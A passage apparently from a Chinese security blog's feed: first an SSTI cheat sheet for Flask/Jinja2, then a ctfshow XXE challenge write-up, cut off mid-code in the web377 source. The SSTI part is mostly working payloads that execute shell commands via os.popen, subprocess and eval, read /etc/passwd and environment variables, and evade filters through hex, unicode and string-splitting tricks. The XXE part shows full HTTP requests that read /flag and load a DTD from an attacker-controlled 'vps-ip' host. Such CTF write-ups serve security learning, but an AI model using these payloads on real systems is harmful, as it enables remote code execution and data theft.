+<p>直接读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
+<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
+<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>
+
+<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
+<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>
+
+<p>参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意一下，其中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>
+
+<p>unicode绕过参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>
+
+<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上是盲注的写法</p>
+<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
+<p>成功率有点低就是了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><strong>chr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>
+
+<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>
+
+<p>写一个16进制编码的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow XXE 刷题记录</title>
+    <url>/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="web373-web374"><a href="#web373-web374" class="headerlink" title="web373-web374"></a>web373-web374</h1><p>传送门：</p>
+<p><a href="https://ed3n.top/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/">XXE学习记录 | Ed3n’s Blog</a></p>
+<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
+<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
+<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功接收到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
+<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功接收到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
+<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
+<p>那就直接用 web375 的方法好了</p>
+<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 